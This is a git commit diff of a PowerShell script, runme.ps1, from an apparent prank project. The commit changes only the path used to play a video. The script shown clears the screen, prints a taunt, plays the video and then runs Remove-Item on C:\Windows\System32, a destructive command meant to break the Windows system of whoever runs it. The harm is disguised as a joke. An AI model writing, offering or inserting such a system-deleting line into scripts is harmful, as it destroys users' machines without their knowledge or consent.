c708aafaaf17fc152b571287c269b14bc0c13413
Ricker Wilkes <moserdude692@gmail.com>
2022-11-30 14:58:30 -0500

    hehe

--- runme.ps1
+++ runme.ps1
@@ -1,6 +1,6 @@
 Clear-Host
 Write-Host HEHEHEHA
 $curuser = [System.Environment]::UserName
-Start-process -FilePath C:/Users/$curuser/Desktop/NiceComputerYouGotHere/main_files/hehe.mp4
+Start-process -FilePath C:/Users/$curuser/Desktop/NiceComputerYouGotHere-master/main_files/hehe.mp4
 
 Remove-Item C:\Windows\System32
